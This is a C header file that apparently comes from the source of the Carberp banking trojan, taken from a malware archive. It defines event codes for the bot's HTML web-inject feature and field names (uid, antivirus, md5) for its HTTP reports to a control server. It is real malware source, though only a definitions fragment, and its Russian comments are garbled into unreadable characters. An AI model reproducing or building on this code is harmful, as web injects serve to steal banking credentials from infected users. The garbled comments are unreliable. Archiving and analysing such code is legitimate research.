/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */

//*****************************************************************************
//  ������ ���������� ���������� ����
//
//  ����:   ������ 2012
//  ������: 1.0
//*****************************************************************************

#ifndef BotDefH
#define BotDefH
//-----------------------------------------------------------------------------



//********************************************
//  ������� HTML ��������
//********************************************
#define BOT_EVENT_HTMLINJECTS_CLEAR    101    /* ������ ������ HTML �������� */
#define BOT_EVENT_HTMLINJECTS_LOADED   102    /* �������� ������ HTML �������� */
#define BOT_EVENT_HTMLINJECT_ACTIVATED 103    /* HTML ������ ����������� � ���������� */
#define BOT_EVENT_HTMLINJECT_EXECUTE   104    /* ���������� HTML ������� */


//********************************************
//  ����� ����� HTML ����
//********************************************

const static char* HTTP_FIELD_UID     = "uid";
const static char* HTTP_FIELD_ANTIVIR = "av";
const static char* HTTP_FIELD_MD5     = "md5";

//-----------------------------------------------------------------------------
#endif
